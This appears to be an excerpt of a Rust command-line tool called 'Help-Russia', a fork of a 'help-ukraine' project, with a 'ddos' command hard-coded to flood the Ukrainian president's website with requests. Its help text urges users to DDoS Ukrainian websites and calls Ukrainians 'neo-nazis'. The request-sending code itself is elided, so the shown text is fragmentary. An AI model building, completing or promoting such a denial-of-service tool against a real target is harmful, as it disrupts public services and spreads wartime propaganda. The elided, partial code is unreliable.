...
// Github : https://github.com/TheHolyTachanka
...
fn main() {
    ...
    match command {
        "ddos" => {
            ...
            println!("\n{}[ i ] : Starting...\n", GREEN);
            let url = String::from("https://www.president.gov.ua/"); // url to send requests to
        ...
        "help" => {
            println!("{}{} Help-Russia {}", BG_MAGENTA, WHITE, RESET);
            println!("{}━━━━━━━━━━━━━━━━━{}", MAGENTA, RESET);
            println!("Author: {}TheHolyTachanka{}", MAGENTA, RESET);
            println!("Github: {}https://github.com/TheHolyTachanka{}", MAGENTA, RESET);       
            println!("Fork of: {}https://github.com/SkwalExe/help-ukraine{}", MAGENTA, RESET);
            println!("{}━━━━━━━━━━━━━━━━━{}", MAGENTA, RESET);
            println!(
                "{}Help russia by ddosing ukrainian websites to help in the war against these neo-nazis{}",
                MAGENTA, RESET
            );
            println!("{}━━━━━━━━━━━━━━━━━{}", MAGENTA, RESET);
